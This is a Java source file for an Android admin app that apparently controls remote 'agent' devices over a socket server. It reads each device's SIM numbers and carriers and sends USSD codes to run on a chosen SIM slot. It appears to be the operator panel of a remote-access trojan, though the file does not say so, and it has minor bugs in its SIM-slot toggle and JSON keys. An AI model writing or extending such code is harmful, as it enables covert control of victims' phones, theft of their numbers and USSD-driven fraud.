package com.pegalite.neotronadmin.ui.actions;

import static android.view.View.GONE;
import static android.view.View.VISIBLE;

import android.os.Bundle;
import android.widget.Toast;

import androidx.core.content.ContextCompat;

import com.pegalite.alerts.dialog.PegaSuccessDialog;
import com.pegalite.alerts.utils.DialogData;
import com.pegalite.neotronadmin.R;
import com.pegalite.neotronadmin.databinding.ActivityRunUssdcodeBinding;
import com.pegalite.neotronadmin.functions.alerts.SendingDialog;
import com.pegalite.neotronadmin.functions.server.socket.PegaSocketServer;
import com.pegalite.neotronadmin.functions.viewmanagers.PegaAnimationManager;
import com.pegalite.neotronadmin.functions.viewmanagers.PegaAppCompatActivity;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.Objects;

import io.socket.client.Ack;

public class RunUSSDCodeActivity extends PegaAppCompatActivity {

    ActivityRunUssdcodeBinding binding;

    int slotIndex = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        binding = ActivityRunUssdcodeBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());

        setWindowThemeMain();
        setBackWithRightAnim();

        binding.back.setOnClickListener(v -> getOnBackPressedDispatcher().onBackPressed());

        String agentID = getIntent().getStringExtra("agentID");
        String deviceName = getIntent().getStringExtra("deviceName");
        binding.title.setText(deviceName);

        binding.send.setOnClickListener(v -> {
            String ussd = binding.ussdCode.getText().toString();

            if (ussd.isBlank()) {
                PegaAnimationManager.shake(binding.ussdCode);
                Toast.makeText(this, "Enter An Valid USSD Code", Toast.LENGTH_SHORT).show();
                return;
            }

            sendUSSD(agentID, ussd);

        });

        binding.sim1.setOnClickListener(v -> {
            if (slotIndex == 0) {
                return;
            }

            slotIndex++;
            binding.sim1.setBackgroundDrawable(ContextCompat.getDrawable(this, R.drawable.btn_round_light_blue));
            binding.sim2.setBackgroundDrawable(ContextCompat.getDrawable(this, R.drawable.btn_round_light_fade));

        });

        binding.sim2.setOnClickListener(v -> {
            if (slotIndex == 1) {
                return;
            }

            slotIndex--;
            binding.sim2.setBackgroundDrawable(ContextCompat.getDrawable(this, R.drawable.btn_round_light_blue));
            binding.sim1.setBackgroundDrawable(ContextCompat.getDrawable(this, R.drawable.btn_round_light_fade));

        });

        PegaSocketServer.getSocket().emit("get_sim_status", agentID, (Ack) args -> {
            runOnUiThread(() -> {
                JSONObject data = (JSONObject) args[0];
                binding.progress.setVisibility(GONE);
                if (data.optString("status").equals("success")) {
                    setSimDetails(Objects.requireNonNull(data.optJSONArray("data")));
                    binding.detailsContainer.setVisibility(VISIBLE);
                } else {
                    binding.simDetailsContainer.setVisibility(GONE);
                    binding.errorMessage.setVisibility(VISIBLE);
                    binding.errorMessage.setText(data.optString("msg"));
                }
            });
        });
    }

    private void setSimDetails(JSONArray data) {
        if (data.length() == 0) {
            return;
        }

        JSONObject sim1Info = data.optJSONObject(0);
        binding.number1.setText(sim1Info.optString("number"));
        binding.carrierName1.setText(sim1Info.optString("carrierName"));
        binding.displayName1.setText(sim1Info.optString("displayName"));
        binding.sim1.setVisibility(VISIBLE);

        JSONObject sim2Info = data.optJSONObject(1);
        if (data.length() > 1) {
            binding.number2.setText(sim2Info.optString("number"));
            binding.carrierName2.setText(sim2Info.optString("carrierName:"));
            binding.displayName2.setText(sim2Info.optString("displayName"));
            binding.sim2.setVisibility(VISIBLE);
        }
    }

    private void sendUSSD(String agentID, String ussd) {
        SendingDialog sendingDialog = new SendingDialog(getActivity(), DialogData.UN_CANCELABLE);
        sendingDialog.show("Sending USSD Code...");
        addDialogToDestroyList(sendingDialog);
        PegaSocketServer.getSocket().emit("run-ussd", agentID, ussd, slotIndex, (Ack) args -> {
            runOnUiThread(() -> {
                sendingDialog.dismiss();
                JSONObject data = (JSONObject) args[0];
                if (data.optString("status").equals("success")) {
                    PegaSuccessDialog successDialog = new PegaSuccessDialog(getActivity(), DialogData.DISMISS_ON_CANCEL);
                    successDialog.show("Ussd Code Executed Successfully!");
                    addDialogToDestroyList(sendingDialog);
                } else {
                    binding.simDetailsContainer.setVisibility(GONE);
                    binding.detailsContainer.setVisibility(GONE);
                    binding.errorMessage.setVisibility(VISIBLE);
                    binding.errorMessage.setText(data.optString("msg"));
                }
            });
        });
    }
}